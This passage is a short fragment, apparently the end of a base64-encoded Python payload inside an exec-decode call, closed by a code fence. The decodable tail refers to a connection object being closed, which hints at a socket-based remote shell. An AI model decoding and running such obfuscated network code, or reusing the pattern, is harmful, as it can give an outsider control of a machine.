SgidXRmLTgiKSkKICAgIGVsc2U6cGFzcztjb25uLmNsb3NlKCk='))"
```
